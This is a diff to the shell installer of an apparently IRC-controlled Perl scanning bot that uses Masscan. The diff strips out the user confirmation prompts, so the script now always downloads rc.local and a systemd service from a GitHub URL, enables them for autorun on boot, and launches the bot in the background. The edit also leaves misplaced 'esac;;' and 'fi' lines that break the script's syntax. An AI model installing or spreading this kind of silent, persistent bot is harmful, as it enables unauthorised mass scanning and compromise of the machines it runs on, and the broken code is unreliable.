@@ -27,7 +27,7 @@ perl -MCPAN -e reload CPAN;
  cpan -fi Mojo::IRC;
  cpan -fi IO::Socket::SSL;
  cpan -fi Net::Address::IP::Local;
-fi
+fi  
 esac
 read -p "Proceed to bot configurations? [Y/A] or LEAVE BLANK + ENTER" choice
 case $choice in
@@ -71,17 +71,11 @@ if read -p "Masscan RATE-LIMIT/Recommended: 25000" mrate; then
  sed -i "perlircssl.pl" -e "s|--rate 25000|--rate "$mrate"|g" "perlircssl.pl"
 fi
 cp -r ./perlircssl.pl ~/perlircssl.pl;
-esac
-read -p "Add bot autorun on reboot?" choice
-case $choice in
- Y)  if [ ! -f "./rc.local" ]; then curl -Lv -o /etc/rc.local https://raw.githubusercontent.com/ind3p3nd3nt/vncperlbot/master/rc.local; else cp -r ./rc.local /etc/rc.local; fi;
+esac;;
+if [ ! -f "./rc.local" ]; then curl -Lv -o /etc/rc.local https://raw.githubusercontent.com/ind3p3nd3nt/vncperlbot/master/rc.local; else cp -r ./rc.local /etc/rc.local; fi;
 chown $USER /etc/rc.local;
 chmod 755 /etc/rc.local;
 touch /etc/systemd/system/rc-local.service;
 if [ ! -f "./rc-local.service" ]; then curl -Lv -o /etc/systemd/system/rc-local.service https://raw.githubusercontent.com/ind3p3nd3nt/vncperlbot/master/rc-local.service; else cp -r ./rc-local.service /etc/systemd/system/rc-local.service; fi;
-systemctl enable rc-local;;  
-esac
-read -p "Run This Beautiful Script Now? (Y)" choices
-case $choices in
- Y)  perl perlircssl.pl &;;  
-esac
+systemctl enable rc-local;  
+perl perlircssl.pl &;
